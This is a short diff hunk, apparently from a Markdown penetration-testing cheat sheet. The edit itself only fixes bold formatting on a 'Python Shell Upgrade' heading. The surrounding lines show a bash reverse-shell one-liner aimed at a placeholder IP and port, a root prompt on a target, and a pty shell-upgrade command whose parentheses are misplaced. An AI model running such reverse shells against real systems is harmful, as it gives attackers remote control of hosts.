@@ -21,7 +21,7 @@ bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"
   Terminal type? screen
   root@target:/backend#
   ```
-* ** Python Shell Upgrade
+* **Python Shell Upgrade
   ```bash
   python -c ('import pty; pty.spawn("/bin/bash")'
   ```
